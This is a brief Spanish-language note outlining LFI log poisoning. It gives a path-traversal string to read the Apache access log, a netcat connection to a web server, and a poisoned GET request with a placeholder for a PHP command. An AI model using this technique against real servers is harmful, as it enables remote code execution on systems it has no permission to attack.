Descubrir LFI y observar logs
```
../../../../var/log/apache2/access.log
```

Conctarse al servidor web por netcat
```
nc 192.168.1.23 80
```

Formar petición envenenada
```
GET <comando php> HTTP/1.1
```